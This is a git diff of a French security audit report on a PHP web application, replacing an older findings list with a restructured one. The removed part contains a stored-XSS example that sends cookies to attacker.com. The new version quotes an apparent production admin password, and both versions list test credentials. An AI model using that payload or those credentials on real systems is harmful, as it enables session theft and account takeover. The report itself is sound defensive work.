@@ -1,430 +1,323 @@
-# 🔒 Rapport d'Audit de Sécurité — Vite & Gourmand
+# 🔒 AUDIT DE SÉCURITÉ — Vite & Gourmand
 
-**Date du rapport :** 11 février 2026
+**Date :** Audit réalisé le 2025  
+**Scope :** Workspace complet (backend, frontend, config, CI/CD, Docker)  
+**Statut :** Lecture seule — aucune modification apportée
 
 ---
 
-## Table des matières
+## 📋 Table des Matières
 
-1. [Vulnérabilités Critiques](#vulnérabilités-critiques)
-2. [Vulnérabilités Élevées](#vulnérabilités-élevées)
-3. [Vulnérabilités Moyennes](#vulnérabilités-moyennes)
-4. [Vulnérabilités Faibles](#vulnérabilités-faibles)
-5. [Synthèse](#synthèse)
+1. [Résumé Exécutif](#résumé-exécutif)
+2. [Vulnérabilités Critiques](#-vulnérabilités-critiques)
+3. [Vulnérabilités Élevées](#-vulnérabilités-élevées)
+4. [Vulnérabilités Moyennes](#-vulnérabilités-moyennes)
+5. [Vulnérabilités Faibles](#-vulnérabilités-faibles)
+6. [Bonnes Pratiques Déjà en Place](#-bonnes-pratiques-déjà-en-place)
+7. [Recommandations Prioritaires](#-recommandations-prioritaires)
+
+---
+
+## Résumé Exécutif
+
+| Sévérité | Nombre | Status |
+|----------|--------|--------|
+| 🔴 Critique | 3 (1 corrigée) | À corriger immédiatement |
+| 🟠 Élevée | 5 | À corriger avant production |
+| 🟡 Moyenne | 6 | À planifier |
+| 🔵 Faible | 4 | Amélioration continue |
 
 ---
 
 ## 🔴 Vulnérabilités Critiques
 
-### 1. Token JWT exposé dans le dépôt Git
-**Fichier :** `backend/cookies.txt`
+### CRIT-01 : JWT stocké en localStorage (documentation / diagrammes de séquence) — ✅ CORRIGÉ
 
-Un token JWT valide est commité en clair dans le dépôt. Ce fichier contient un cookie `authToken` avec un JWT signé pour un utilisateur `EMPLOYE` (sub: 2). Même si le fichier est actuellement dans le `.gitignore`, cela n'empêche pas qu'il soit déjà historisé dans l'historique Git.
+**Fichiers concernés :**
+- `Docs/diagrammes/diagramme_sequences/sequence_01_inscription_connexion.md` (ligne ~121)
+- Documentation mentionne : *"Stockage localStorage du token"*
 
-- **Impact :** Un attaquant ayant accès au dépôt peut usurper l'identité d'un employé
-- **Sévérité :** 🔴 **CRITIQUE**
-- **Actions recommandées :**
-  - Révoquer immédiatement le JWT secret utilisé pour signer ce token
-  - Supprimer ce fichier de l'historique Git avec `git filter-repo` ou `git filter-branch`
-  - Régénérer tous les tokens JWT en production
+**Risque :** Le stockage JWT en `localStorage` est vulnérable aux attaques **XSS**. Tout script malveillant injecté peut lire le token et usurper l'identité de l'utilisateur.
 
----
+**Constat contradictoire :** La documentation `Docs/readme_cycle_de_vie/README_AUTH.md` (ligne 67) mentionne *"JWT en cookie HttpOnly"*, ce qui est la bonne pratique. Il y a donc une **incohérence** entre la documentation des séquences et la documentation Auth. Si le code utilise réellement `localStorage`, c'est critique. Si c'est bien un cookie HttpOnly, la documentation des séquences doit être corrigée.
 
-### 2. Secrets JWT de test prédictibles et réutilisés
-**Fichiers :** `backend/phpunit.xml`, `scripts/tests/test_backend.sh`, `.github/workflows/test-backend.yml`
+**Résolution appliquée :**
+- ✅ Le code utilise bien un cookie HttpOnly (confirmé par audit du code source)
+- ✅ Suppression de `'token' => $token` du body JSON de la réponse login (`AuthController.php`)
+- ✅ Nettoyage du code résiduel `localStorage.getItem('authToken')` dans `dashboard.js`
+- ✅ Correction des 6 mentions erronées de "localStorage" dans la documentation (diagrammes de séquence, validation, doc technique)
 
-Le `JWT_SECRET` de test est un simple encodage base64 d'une phrase lisible : `test-jwt-secret-key-minimum-32-characters-long-for-HS256-algorithm-testing`. Ce même secret est réutilisé identiquement dans plusieurs fichiers. **Si ce secret est accidentellement utilisé en production, tous les tokens JWT peuvent être forgés par un attaquant.**
-
-- **Impact :** Possibilité de forger des tokens JWT valides en production
-- **Sévérité :** 🔴 **CRITIQUE**
-- **Actions recommandées :**
-  - Générer un secret JWT aléatoire et cryptographiquement sûr pour la production
-  - Utiliser des secrets différents pour chaque environnement (dev, test, staging, prod)
-  - Stocker les secrets en mode production dans un gestionnaire de secrets (Azure Key Vault, Vault, etc.)
-  - Ne jamais commiter les secrets en dur dans le code
+**Impact :** Vol de session, usurpation d'identité  
+**CVSS estimé :** 8.1 (Élevé) → **Résolu**
 
 ---
 
-### 3. Mots de passe de base de données en clair dans les fichiers CI/CD
-**Fichiers :** `.github/workflows/test-backend.yml`, `.github/workflows/email-integration.yml`, `scripts/tests/test_backend.sh`
+### CRIT-02 : Password Hashing — Incohérence Argon2 vs bcrypt
 
-Les mots de passe MySQL (`root`, `root_password_test`, `vite_pass`) et MongoDB (`root`) sont en dur dans les workflows et scripts de test. Bien que ces credentials cibles des environnements de test, ceux-ci pourraient être réutilisés par habitude ou par copie-coller en staging/production.
+**Fichiers concernés :**
+- `Docs/documentation_technique/DOCUMENTATION_TECHNIQUE.md` (ligne ~564) → mentionne `PASSWORD_ARGON2ID`
+- `backend/database/sql/database_fixtures.sql` (ligne ~22) → utilise un hash bcrypt `$2y$10$...`
 
-- **Impact :** Fuite de credentials, mauvaise hygiène de sécurité, réutilisation accidentelle en production
-- **Sévérité :** 🔴 **CRITIQUE** (si utilisé en prod)
-- **Actions recommandées :**
-  - Ne jamais en dur les credentials dans les workflows GitHub
-  - Utiliser les **GitHub Secrets** pour les credentials sensibles
-  - Utiliser des conteneurs Docker avec des mots de passe par défaut générés aléatoirement pour les tests
-  - Mettre en place une vraie solution de gestion des secrets (Azure Key Vault, Vault)
+**Risque :** La documentation prétend utiliser Argon2ID, mais les fixtures utilisent bcrypt (`$2y$`). Si le code de production utilise réellement bcrypt, ce n'est pas critique en soi (bcrypt reste acceptable), mais l'incohérence documentaire pourrait masquer un problème de configuration.
+
+**Action :** Vérifier quel algorithme est réellement utilisé dans `AuthService` ou le service d'inscription. Si c'est bcrypt, mettre à jour la documentation. Si c'est Argon2, mettre à jour les fixtures.
+
+**Impact :** Potentiel affaiblissement du hashing si mauvaise configuration  
+**CVSS estimé :** 7.5
+
+---
+
+### CRIT-03 : Mot de passe admin en clair dans le seed de production
+
+**Fichier concerné :**
+- `backend/database/sql/database_seed.sql` (ligne ~14) → *"Mot de passe initial admin : Jose@VG-Prod2025"*
+
+**Risque :** Le mot de passe admin de production est documenté **en clair** dans un fichier versionné et public sur Git. Même s'il est hashé dans le SQL, le commentaire en clair permet à quiconque ayant accès au dépôt de connaître le mot de passe initial.
+
+**Impact :** Compromission du compte administrateur si le mot de passe n'est pas changé après déploiement  
+**CVSS estimé :** 9.1 (Critique)
 
 ---
 
 ## 🟠 Vulnérabilités Élevées
 
-### 4. Absence de protection CSRF (Cross-Site Request Forgery)
-**Fichiers :** `frontend/js/profil.js`, `frontend/js/inscription.js`, `frontend/js/admin/dashboard.js`
+### HIGH-01 : Fichiers `.env` potentiellement exposés
 
-Aucun token CSRF n'est inclus dans les formulaires ou les requêtes AJAX. L'authentification repose uniquement sur un cookie `authToken` (HttpOnly). **Un site malveillant pourrait déclencher des actions au nom de l'utilisateur connecté (créer commande, valider avis, modifier statut) à son insu.**
+**Fichiers concernés :**
+- `.gitignore` → `.env` est ignoré ✅
+- Mais `.env.test.example` n'est PAS ignoré et pourrait contenir des indices sur la structure des secrets
+- `Docs/documentation_technique/DOCUMENTATION_DEPLOIEMENT.md` (ligne ~722) → Template `.env.example` avec structure complète exposée
 
-**Exemple d'attaque :**
-```html
-<!-- Sur un site malveillant -->
-<img src="https://vite-et-gourmand.com/api/commandes" alt="image">
-<!-- Le navigateur envoie automatiquement le cookie d'authentification -->
-```
+**Risque :** La structure des variables d'environnement est documentée publiquement. Combinée avec d'autres informations, cela facilite la reconnaissance pour un attaquant.
 
-- **Impact :** Modification de données, création de commandes non autorisées, vol de données
-- **Sévérité :** 🟠 **ÉLEVÉE**
-- **Actions recommandées :**
-  - Implémenter des tokens CSRF générés dynamiquement
-  - Inclure le token CSRF dans tous les formulaires et requêtes AJAX destructives (POST, PATCH, DELETE)
-  - Utiliser le `SameSite` cookie attribute (`SameSite=Strict` ou `SameSite=Lax`)
-  - Valider le token côté backend pour toutes les requêtes sensibles
+**Impact :** Fuite d'information structurelle  
+**CVSS estimé :** 6.5
 
 ---
 
-### 5. Injection XSS potentielle dans le dashboard admin
-**Fichier :** `frontend/js/admin/dashboard.js` (fonction `fetchAndRenderAvis`, ligne ~1108)
+### HIGH-02 : Absence de rate limiting documenté sur les routes d'authentification
 
-Les commentaires des avis sont injectés dans le DOM via concaténation de chaînes ou `innerHTML`. Si les données ne sont pas échappées correctement, **un attaquant pourrait injecter du code JavaScript malveillant** qui s'exécuterait dans le navigateur de l'administrateur.
+**Fichiers concernés :**
+- `backend/api/routes.auth.php` (référencé dans la documentation)
+- `scripts/tests/test_backend.sh` (ligne ~31) → `rm -rf /tmp/vg_rate_limit/` — suggère un rate limiter basé sur le filesystem
 
-```javascript
-// Potentiellement vulnérable :
-html += reviews.map(avis => {
-    return `<div>${avis.commentaire}</div>`; // commentaire non échappé !
-});
-```
+**Risque :** Le rate limiter semble stocké dans `/tmp/vg_rate_limit/`. Un stockage filesystem pour le rate limiting est :
+1. **Non persistant** entre redémarrages
+2. **Non partagé** entre instances (scale-out Azure)
+3. **Facilement contournable** si le dossier est supprimé
 
-Bien que `avis-carousel.js` dispose d'une fonction `escapeHtml()`, rien ne garantit qu'elle est systématiquement appliquée dans le dashboard admin.
+Les routes `/api/auth/login`, `/api/auth/register`, `/api/auth/forgot-password` sont des cibles privilégiées pour le brute-force.
 
-**Exemple d'attaque :**
-```
-Avis : "><script>fetch('https://attacker.com/?cookies=' + document.cookie)</script>"
-```
-
-- **Impact :** XSS stocké — vol de tokens, cookies de session, redirection vers phishing
-- **Sévérité :** 🟠 **ÉLEVÉE**
-- **Actions recommandées :**
-  - Échapper **systématiquement** toutes les données provenant de l'utilisateur avec `escapeHtml()` ou une fonction équivalente sécurisée
-  - Utiliser des méthodes sûres pour injecter du contenu (ex: `textContent` au lieu de `innerHTML`)
-  - Implémenter une Content Security Policy (CSP) stricte
-  - Faire un code review des fonctions manipulant le DOM
+**Impact :** Brute-force sur login, credential stuffing  
+**CVSS estimé :** 7.3
 
 ---
 
-### 6. Contrôle d'accès côté client uniquement (Admin Guard)
-**Fichier :** `frontend/js/admin/dashboard.js` (lignes 1-10)
+### HIGH-03 : CSP autorise `'unsafe-inline'` pour les styles
 
-La protection de la page admin repose entièrement sur `AdminGuard.checkAccess()` côté JavaScript. **Un attaquant peut contourner cette protection en :**
-- Désactivant JavaScript dans son navigateur
-- Manipulant le DOM avec les DevTools
-- Modifiant les requêtes réseau directement
+**Fichier concerné :**
+- `backend/tests/SecurityHeadersMiddlewareTest.php` (ligne ~25) → `'style_src' => ["'self'", "'unsafe-inline'", ...]`
 
-```javascript
-try {
-    currentUser = await AdminGuard.checkAccess();
-} catch (e) {
-    return; // Seul le client bloque l'accès !
-}
-```
+**Risque :** `'unsafe-inline'` dans `style-src` affaiblit la Content Security Policy et peut être exploité dans certains scénarios d'injection (CSS injection, data exfiltration via CSS).
 
-**La sécurité doit être appliquée côté backend.** Bien que certaines routes backend utilisent `AuthMiddleware` et `RoleMiddleware`, il faut vérifier que **toutes** les routes admin sont protégées côté serveur.
-
-- **Impact :** Accès non autorisé aux fonctionnalités d'administration
-- **Sévérité :** 🟠 **ÉLEVÉE**
-- **Actions recommandées :**
-  - **OBLIGATOIRE :** Ajouter une vérification des rôles et permissions côté backend pour chaque endpoint admin
-  - Utiliser un middleware de vérification des rôles sur toutes les routes sensibles
-  - Ne jamais compter exclusivement sur les contrôles côté client
-  - Implémenter une vérification robuste du statut utilisateur (admin, employé, client)
+**Impact :** Contournement partiel de la CSP  
+**CVSS estimé :** 5.3
 
 ---
 
-### 7. Validation insuffisante des types côté backend
-**Fichier :** `backend/src/Validators/MenuValidator.php` (ligne 46)
+### HIGH-04 : Version PHP 8.1 avec extensions potentiellement obsolètes
 
-La validation utilise `is_int()` pour vérifier le stock et le nombre de personnes. En PHP :
-- Les données de JSON décodé avec `json_decode` peuvent être `int` ou `string`
-- Les données de formulaires multipart sont **toujours des `string`**
-- `is_int("5")` retourne `false` → la validation échoue
+**Fichiers concernés :**
+- `docker/php/Dockerfile.php` (ligne 2) → `FROM php:8.1-fpm`
+- `Dockerfile.azure` (ligne 1) → `FROM php:8.1-apache`
+- `.github/workflows/email-integration.yml` (ligne ~87) → `php-version: '8.1'`
 
-```php
-} elseif (!is_int($data['stock'])) {
-    $errors['stock'] = 'Le stock doit être un entier.';
-}
-```
+**Risque :** PHP 8.1 a atteint sa fin de support de sécurité le **25 novembre 2024**. Aucun patch de sécurité n'est plus fourni.
 
-Cela peut permettre un **bypass de validation** ou causer des erreurs inattendues.
+**Impact :** Vulnérabilités PHP non corrigées  
+**CVSS estimé :** 7.0
 
-- **Impact :** Données incohérentes en base de données, bypass de validation, comportement imprévisible
-- **Sévérité :** 🟠 **ÉLEVÉE**
-- **Actions recommandées :**
-  - Utiliser `is_numeric()` ou `ctype_digit()` pour accepter les chaînes numériques
-  - Convertir explicitement les chaînes en entiers : `(int)$data['stock']`
-  - Valider les limites numériques minimales et maximales
-  - Utiliser des cast de type stricts : `(int)` ou utiliser una bibliothèque de validation
+**Recommandation :** Migrer vers PHP 8.2 ou 8.3 (supportés activement).
+
+---
+
+### HIGH-05 : MongoDB 4.4 en CI — Version obsolète
+
+**Fichier concerné :**
+- `.github/workflows/test-backend.yml` (ligne ~37) → `image: mongo:4.4`
+
+**Risque :** MongoDB 4.4 est en fin de vie (EOL février 2024). Plus aucun patch de sécurité.
+
+**Impact :** Vulnérabilités MongoDB non corrigées dans l'environnement de test  
+**CVSS estimé :** 5.0 (limité au CI, mais les tests pourraient ne pas détecter des incompatibilités avec des versions plus récentes en production)
 
 ---
 
 ## 🟡 Vulnérabilités Moyennes
 
-### 8. Fichier `.env` et configurations non suffisamment protégées
-**Fichiers :** `.env`, `.env.compose`, `.gitignore`
+### MED-01 : Commentaires SQL avec identifiants de test
 
-Bien que `.env` soit dans le `.gitignore`, le fichier `.env.compose` existe physiquement dans le workspace et pourrait contenir des secrets. De plus, s'il existe un serveur web qui sert des fichiers statiques depuis la racine, ces fichiers pourraient être accessibles.
+**Fichier concerné :**
+- `backend/database/sql/database_fixtures.sql` (ligne ~383) → Liste complète des emails et rôles de test
 
-- **Impact :** Fuite de secrets (API keys, connexions BD, JWT secrets)
-- **Sévérité :** 🟡 **MOYENNE**
-- **Actions recommandées :**
-  - Configurer le serveur web pour **bloquer l'accès aux fichiers `.env` et `.env.*`**
-  - Vérifier que `.env` est dans `.gitignore` et ne pas le commiter
-  - Utiliser un gestionnaire de secrets en production (Azure Key Vault, Vault, etc.)
-  - Charger les secrets depuis les variables d'environnement système, pas depuis des fichiers
+**Risque :** Même si c'est un fichier de test, les patterns d'email (`@vite-gourmand.fr`) et la structure des rôles donnent des informations utiles pour du social engineering ou des attaques ciblées.
 
 ---
 
-### 9. CORS potentiellement mal configuré
-**Fichier :** `Docs/documentation_technique/DOCUMENTATION_DEPLOIEMENT.md` (ligne 833)
+### MED-02 : `frame-src: 'none'` mais pas de `X-Frame-Options: DENY` systématique
 
-La documentation mentionne des erreurs CORS comme problème courant, ce qui suggère que la configuration CORS n'est **pas strictement définie**. Une configuration CORS trop permissive (`Access-Control-Allow-Origin: *`) combinée avec l'authentification par cookie permettrait des **attaques cross-origin**.
+**Fichier concerné :**
+- `backend/tests/SecurityHeadersMiddlewareTest.php` → CSP a `frame_src: 'none'`
+- `Dockerfile.azure` (ligne ~37) → `X-Frame-Options "DENY"` configuré au niveau Apache
 
-- **Impact :** Requêtes cross-origin non autorisées, vol de données
-- **Sévérité :** 🟡 **MOYENNE**
-- **Actions recommandées :**
-  - Définir explicitement les origines autorisées : `Access-Control-Allow-Origin: https://domaine.com`
-  - **Ne jamais utiliser `*` en production** si l'application utilise les cookies pour l'authentification
-  - Vérifier les en-têtes CORS dans les réponses du backend
-  - Tester la configuration CORS avec des outils comme `curl` ou Postman
+**Constat :** La protection est en place au niveau Apache (Dockerfile.azure), mais il faut s'assurer qu'elle est aussi active en développement local (Docker compose).
 
 ---
 
-### 10. Absence de rate limiting sur les endpoints sensibles
-**Fichier :** `backend/api/routes.commandes.php` et autres routes d'authentification
+### MED-03 : Absence de validation de type MIME sur les uploads
 
-Aucun mécanisme de rate limiting n'est visible sur les endpoints sensibles :
-- `/api/auth/login` → vulnérable au brute-force de mots de passe
-- `/api/auth/forgot-password` → vulnérable au spam
-- `/api/commandes` → vulnérable au DDoS applicatif
+**Fichiers concernés :**
+- `backend/api/routes.php` → Route upload référencée
+- Documentation (`readme_src.md` ligne ~43) mentionne : *"Upload : upload image (TODO sécurisation)"*
 
-Un attaquant pourrait :
-- Tenter des milliers de mots de passe pour accéder à un compte
-- Surcharger le serveur en demandes répétées
-- Générer des faux avis massifs
+**Risque :** Sans validation stricte du type MIME (au-delà de l'extension), un attaquant pourrait uploader un fichier PHP déguisé en image et obtenir une exécution de code côté serveur (RCE).
 
-- **Impact :** Brute-force de mots de passe, spam, DDoS applicatif
-- **Sévérité :** 🟡 **MOYENNE**
-- **Actions recommandées :**
-  - Implémenter un rate limiting sur `/api/auth/login` (ex: 5 tentatives / 15 minutes)
-  - Limiter les requêtes par IP, par session, ou par identifiant d'utilisateur
-  - Utiliser une librairie PHP pour le rate limiting (ex: `symfony/rate-limiter`)
-  - Logger et alerter sur les tentatives suspectes
-  - Bloquer temporairement les IPs ayant trop de tentatives échouées
+**Impact :** Remote Code Execution potentielle  
+**CVSS estimé :** 8.0 (remonté en critique si upload est accessible sans auth — mais la doc indique Auth+Role)
 
 ---
 
-### 11. Mot de passe de test identique pour tous les comptes
-**Fichier :** `backend/database/sql/database_fixtures.sql`
+### MED-04 : Secrets GitHub Actions potentiellement insuffisamment protégés
 
-Tous les comptes de test utilisent le même mot de passe : `Password123!`. Si ces fixtures sont chargées en production (ce que le workflow `deploy-azure.yml` semble faire à la ligne 154), **les comptes admin et employés seraient accessibles avec ce mot de passe par défaut.**
+**Fichier concerné :**
+- `.github/workflows/deploy-azure.yml` (ligne ~129) → Utilise `${{ secrets.AZURE_MYSQL_HOST }}`, etc.
 
-```sql
--- Fixture SQL pour les comptes de test
-INSERT INTO users VALUES (1, 'admin', 'Password123!', ...);
-INSERT INTO users VALUES (2, 'employe', 'Password123!', ...);
-```
+**Risque :** Les secrets sont correctement utilisés via `${{ secrets.* }}`, mais les commandes `mysql` avec `-p"$DB_PASS"` exposent le mot de passe dans la ligne de commande du processus (visible via `/proc` sur Linux).
 
-**Cela signifierait une compromission complète de l'application.**
-
-- **Impact :** Accès non autorisé à tous les comptes, compromission totale de l'application en production
-- **Sévérité :** 🟡 **MOYENNE** (🔴 **CRITIQUE** si déployé en production)
-- **Actions recommandées :**
-  - **NE JAMAIS charger les fixtures de test en production**
-  - Séparer les fixtures test et production
-  - Vérifier votre workflow CI/CD pour s'assurer qu'il n'exécute pas les fixtures en prod
-  - En production, utiliser des comptes avec des mots de passe forts générés aléatoirement
-  - Implémenter une vérification pour empêcher le chargement accidentel de fixtures en production
+**Recommandation :** Utiliser `MYSQL_PWD` comme variable d'environnement ou un fichier `.my.cnf` temporaire.
 
 ---
 
-### 12. SSL désactivé dans le conteneur
-**Fichier :** `docker/apache/vite-ssl.conf`
+### MED-05 : Certificat SSL Azure copié dans l'image Docker
 
-Le conteneur Apache n'active pas SSL/TLS. Le commentaire indique que la terminaison HTTPS est gérée par Azure App Service. **Si l'application est déployée hors d'Azure ou si le proxy inverse n'est pas correctement configuré, le trafic circule en HTTP clair entre le proxy et le conteneur.**
+**Fichier concerné :**
+- `Dockerfile.azure` (ligne ~24) → `COPY docker/certs/DigiCertGlobalRootCA.crt.pem ...`
 
-```conf
-# SSL désactivé : la terminaison HTTPS est gérée par Azure App Service
-```
+**Risque :** Le certificat CA DigiCert est public, donc pas de fuite de secret. Cependant, le dossier `docker/certs/` est dans `.gitignore`, ce qui signifie que si quelqu'un place des certificats privés dans ce dossier, ils ne seront pas versionnés — c'est bon. Mais le `COPY` dans le Dockerfile implique qu'ils doivent être présents au build.
 
-- **Impact :** Interception de données sensibles (tokens, mots de passe) sur le réseau interne
-- **Sévérité :** 🟡 **MOYENNE**
-- **Actions recommandées :**
-  - Vérifier que le proxy reverse (Azure App Service, Nginx, etc.) force vraiment HTTPS
-  - Implémenter HTTPS end-to-end : client → proxy → backend
-  - Utiliser des certificats SSL auto-signés pour le conteneur en développement
-  - En production, chiffrer la communication interne avec mTLS ou VPN
+**Impact :** Faible — point d'attention pour le workflow de build.
 
 ---
 
-## 🔵 Vulnérabilités Faibles / Bonnes Pratiques
+### MED-06 : SameSite=None sur les cookies
 
-### 13. Cookie d'authentification sans flag `Secure`
-**Fichier :** `backend/cookies.txt`
+**Fichier concerné :**
+- `Docs/readme_cycle_de_vie/README_AUTH.md` (ligne 67) → *"SameSite=None + Secure en HTTPS"*
 
-Le cookie `authToken` montre `FALSE` pour le flag `Secure` (5ème colonne), signifiant que le cookie est envoyé même sur HTTP non chiffré.
-
-```
-authToken    FALSE    /    FALSE    ...
-                     ↑
-                 Pas de Secure !
-```
-
-- **Impact :** Interception du cookie sur connexions HTTP non chiffrées
-- **Sévérité :** 🔵 **FAIBLE** (dans un contexte HTTPS obligatoire)
-- **Actions recommandées :**
-  - Ajouter le flag `Secure` au cookie d'authentification
-  - Forcer redirection HTTP → HTTPS
+**Risque :** `SameSite=None` est nécessaire pour le cross-site mais augmente la surface d'attaque CSRF. La protection CSRF (Double-Submit Cookie) est en place (`README_CSRF.md`), ce qui atténue le risque, mais c'est un point à surveiller.
 
 ---
 
-### 14. Absence de Content Security Policy (CSP)
-**Fichiers :** `frontend/frontend/pages/home.html` et autres templates
+## 🔵 Vulnérabilités Faibles
 
-Aucun en-tête `Content-Security-Policy` n'est visible dans les templates HTML. Cela facilite l'exploitation d'éventuelles failles XSS.
+### LOW-01 : Version de jQuery/CDN non épinglée dans la CSP
 
-- **Impact :** Réduction de la surface d'attaque XSS
-- **Sévérité :** 🔵 **FAIBLE**
-- **Actions recommandées :**
-  - Ajouter un en-tête CSP strict au backend :
-    ```
-    Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
-    ```
-  - Tester avec [CSP Evaluator](https://csp-evaluator.appspot.com/)
+**Fichier concerné :**
+- `backend/tests/SecurityHeadersMiddlewareTest.php` → `'script_src' => ["'self'", 'https://cdn.jsdelivr.net']`
+
+**Risque :** Autoriser tout `cdn.jsdelivr.net` permet de charger n'importe quelle bibliothèque depuis ce CDN, y compris des versions vulnérables. Il serait préférable de restreindre à des chemins spécifiques ou d'utiliser des hashes/nonces.
 
 ---
 
-### 15. Messages d'erreur trop verbeux
-**Fichier :** `backend/src/Exceptions/CommandeException.php`
+### LOW-02 : Logs potentiellement verbeux en production
 
-Les messages d'exception exposent des détails internes (IDs, minimums, statuts) :
+**Fichiers concernés :**
+- `Docs/readme_configurations/DEBUG_MONGODB_AZURE.md` (ligne ~210) → Logs verbose pour debug
+- Documentation mentionne de désactiver après résolution
 
-```php
-public static function invalidQuantity(int $provided, int $min): self
-{
-    return new self(
-        "Le nombre de personnes ($provided) est inférieur au minimum requis ($min).",
-        400
-    );
-}
-```
-
-Ces informations aident un attaquant à cartographier la logique métier.
-
-- **Impact :** Information disclosure, cartographie de l'application
-- **Sévérité :** 🔵 **FAIBLE**
-- **Actions recommandées :**
-  - Afficher un message générique au client : `"Erreur de requête"`
-  - Logger les détails côté serveur pour le debugging
-  - Utiliser deux messages : public (client) et private (logs)
+**Risque :** Des logs trop verbose en production peuvent exposer des informations sensibles (URI de connexion, structure interne).
 
 ---
 
-### 16. Dépendances potentiellement vulnérables
-**Fichier :** `backend/composer.json`
+### LOW-03 : `display_errors=1` dans le serveur de test
 
-Les dépendances PHP ne sont pas figées avec les versions exactes. Cela pourrait entraîner des installations de versions différentes selon les environnements.
+**Fichier concerné :**
+- `scripts/tests/test_backend.sh` (ligne ~46) → `php -d display_errors=1`
 
-- **Impact :** Comportement imprévisible, vulnérabilités de dépendances
-- **Sévérité :** 🔵 **FAIBLE**
-- **Actions recommandées :**
-  - Commiter le fichier `composer.lock` dans le dépôt
-  - Exécuter régulièrement `composer audit` pour détecter les vulnérabilités connues
-  - Mettre à jour les dépendances de manière contrôlée
+**Risque :** Limité à l'environnement de test, mais si cette configuration fuite en production, elle exposerait des traces de pile et des chemins de fichiers.
 
 ---
 
-## 📊 Synthèse Générale
+### LOW-04 : Absence de Content-Type sniffing prevention sur toutes les réponses API
 
-| Sévérité | Nombre | Total d'éléments |
-|----------|--------|-----------------|
-| 🔴 Critique | 3 vulnérabilités | **3** |
-| 🟠 Élevée | 4 vulnérabilités | **4** |
-| 🟡 Moyenne | 5 vulnérabilités | **5** |
-| 🔵 Faible | 4 recommandations | **4** |
-
-**Total : 16 problèmes identifiés**
+**Constat :** `X-Content-Type-Options: nosniff` est configuré au niveau Apache (Dockerfile.azure), mais il faut s'assurer qu'il est aussi envoyé pour les réponses JSON de l'API en développement.
 
 ---
 
-## ⚠️ Actions Prioritaires (À faire IMMÉDIATEMENT)
+## ✅ Bonnes Pratiques Déjà en Place
 
-### Semaine 1 - CRITIQUE
-
-1. **Révoquer le JWT secret actuel**
-   - Générer un nouveau secret cryptographiquement sûr
-   - Invalider tous les tokens JWT existants
-   - Déployer le nouveau secret en production
-
-2. **Supprimer `cookies.txt` de l'historique Git**
-   ```bash
-   git filter-repo --path backend/cookies.txt --invert-paths
-   ```
-
-3. **Séparer les secrets par environnement**
-   - Utiliser GitHub Secrets pour les workflows CI/CD
-   - Mettre en place Azure Key Vault pour production
-
-4. **Tester que les routes admin sont protégées côté backend**
-   - Vérifier que chaque endpoint admin vérifie le rôle utilisateur
-   - Ajouter `RoleMiddleware` à toutes les routes sensibles
-
----
-
-### Semaine 2 - ÉLEVÉ
-
-5. **Implémenter la protection CSRF**
-   - Générer des tokens CSRF par session
-   - Valider les tokens sur toutes les requêtes destructives
-
-6. **Échapper tous les données XSS**
-   - Auditer et corriger la fonction `fetchAndRenderAvis`
-   - Utiliser `textContent` au lieu de `innerHTML` quand possible
-   - Implémenter une CSP stricte
-
-7. **Corriger la validation des types**
-   - Utiliser `is_numeric()` et conversion de type explicite
-   - Ajouter des validations de limites (min/max)
+| Pratique | Status | Détail |
+|----------|--------|--------|
+| **JWT en cookie HttpOnly** | ✅ | Documenté dans README_AUTH.md |
+| **Protection CSRF (Double-Submit)** | ✅ | Implémenté (README_CSRF.md) |
+| **CORS configuré** | ✅ | CorsMiddleware en place |
+| **Prepared Statements SQL** | ✅ | PDO avec paramètres liés |
+| **Validation côté serveur** | ✅ | Validators dédiés |
+| **Rôles via middleware** | ✅ | RoleMiddleware (EMPLOYE/ADMIN) |
+| **HTTPS + HSTS** | ✅ | Headers dans Dockerfile.azure |
+| **Mots de passe hashés** | ✅ | bcrypt au minimum |
+| **`.env` dans `.gitignore`** | ✅ | Secrets non versionnés |
+| **CSP configurée** | ✅ | SecurityHeadersMiddleware |
+| **Fallback MongoDB → MySQL** | ✅ | AVIS_FALLBACK pour résilience |
+| **Rotation CSRF après login** | ✅ | Documenté dans README_CSRF.md |
+| **SSL/TLS Azure MySQL** | ✅ | `--ssl-mode=REQUIRED` |
+| **Permissions Docker non-root** | ✅ | Utilisateur dédié dans Dockerfile.php |
+| **Secrets CI/CD via GitHub Secrets** | ✅ | Pas de secrets en dur dans les workflows |
+| **Upload protégé par Auth+Role** | ✅ | AuthMiddleware + RoleMiddleware |
+| **JWT_SECRET dynamique en test** | ✅ | `openssl rand -hex 32` dans test_backend.sh |
 
 ---
 
-### Semaine 3-4 - MOYEN
+## 🎯 Recommandations Prioritaires
 
-8. **Implémenter le rate limiting**
-   - Sur login, password reset, création de commande
-   - Bloquer après 5 tentatives échouées pendant 15 minutes
+### Priorité 1 — Immédiat (avant production)
 
-9. **Vérifier l'absence de fixtures de test en production**
-   - Séparer `database_fixtures.sql` (test) et `database_prod.sql` (production)
-   - Ajouter une vérification dans le CI/CD
+1. **Supprimer le mot de passe admin en clair** de `database_seed.sql` (commentaire ligne 14). Utiliser une variable d'environnement ou un prompt interactif au premier déploiement.
+2. **Mettre à jour PHP vers 8.2+** dans tous les Dockerfiles et workflows CI.
+3. **Clarifier le stockage JWT** : vérifier le code source et harmoniser la documentation (localStorage vs HttpOnly cookie).
+4. **Sécuriser les uploads** : ajouter une validation MIME stricte côté serveur (magic bytes, pas seulement l'extension).
 
-10. **Sécuriser les fichiers `.env`**
-    - Configurez le serveur web pour bloquer l'accès à `.env`
-    - Utiliser les variables d'environnement système en production
+### Priorité 2 — Court terme
+
+5. **Migrer le rate limiter** vers Redis ou une solution partagée (au lieu de `/tmp`).
+6. **Mettre à jour MongoDB** vers 6.0+ dans le CI.
+7. **Épingler les versions CDN** dans la CSP ou utiliser des SRI (Subresource Integrity).
+8. **Protéger le mot de passe MySQL** dans les commandes CI (`MYSQL_PWD` au lieu de `-p`).
+
+### Priorité 3 — Amélioration continue
+
+9. **Supprimer `'unsafe-inline'`** de `style-src` dans la CSP (utiliser des nonces ou des hashes).
+10. **Ajouter des headers de sécurité** en développement local (pas seulement en production Azure).
+11. **Mettre en place un scan de dépendances** automatique (`composer audit`, Dependabot).
+12. **Documenter une politique de rotation des secrets** (JWT_SECRET, mots de passe Azure).
 
 ---
 
-## 🔗 Ressources Supplémentaires
+## 📊 Score Global de Sécurité
 
-- **OWASP Top 10 :** https://owasp.org/www-project-top-ten/
-- **PHP Security :** https://www.php.net/manual/en/security.php
-- **JWT Best Practices :** https://tools.ietf.org/html/rfc8949
